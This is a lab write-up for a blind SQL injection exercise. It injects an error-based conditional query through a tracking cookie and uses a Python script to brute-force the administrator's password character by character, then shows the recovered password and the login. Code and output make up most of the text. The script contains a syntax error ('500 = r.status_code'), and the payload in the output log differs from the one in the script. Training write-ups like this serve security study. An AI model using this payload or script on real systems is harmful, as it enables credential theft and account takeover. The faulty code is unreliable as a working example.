### Twelve Exercise 👆


![problem.PNG](/assets/SQLi/Twelve/problem.PNG)


#### **To do**

```
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.    
```

1. Should use a cookie to execute SQL Injection (I use BurpSuite)
![cookie.PNG](/assets/SQLi/Twelve/cookie.PNG)

* The problem informs us that we will be blind, then, if the query is wrong or accert we will receive a 500 or 200 code.


1. Query to inject with python to know the password of **administrator user**
```sql
' || (select case when substr(password, 1, 1) = 'a' then to_char(1/0) else '' end from users where username='administrator') || '
```



1. To discover the password we need to create a program in python to iterate each position:


```python
#!/usr/bin/python3

from pwn import *
import requests, time, string, signal, sys


def handler_stop(sig, frame):
        print("\n\n[!] Exiting... Bye")
        sys.exit(1)

def make_request():
    url = "<url of web page>"
    characteres = string.ascii_lowercase + string.digits
    password = ""
    bar_1 = log.progress("Brute Force")
    bar_1.status("Starting Brute Force...")
    time.sleep(1)
    bar_2 = log.progress("Password")
    
    for i in range(1,21):
        for character in characteres:
            cookie = {f"TrackingId": "<your TrackingId>' || (select case when substring(password,{i},1) = '{character}' then to_char(1/0) end from users where username='administrator') || '",
                    "session": "<your session>"
            }
            bar_1.status(cookie["TrackingId"])
            r = requests.get(url, cookies=cookie)   
            if (500 = r.status_code):
                password += character
                bar_2.status(password)
                break
#! Ctrl + C
signal.signal(signal.SIGINT, handler_stop)

if __name__ == "__main__":
    make_request()
```
* With this program we try to know the letter in each position of password length.
* In each position we try: `abcdefghijklmnopqrstuvwxyz0123456789`




**Output**
```bash
┌──(root㉿est)-[/home/kali/Desktop]
└─| python3 SQL_conditional_error.py 
[ ] Brute Force: beAgM62XEFMyuhEC'||(select case when substr(password,20,1) = 'c' then to_char(1/0) else '' end from users where username='administrator')||'
[┌] Password: 0ayv9e95nhfkfxyjiirc

```

5. Finally login with credentials:
* **username**: administrator
* **password**: [output program]

![login.txt](/assets/SQLi/Eleven/login.PNG)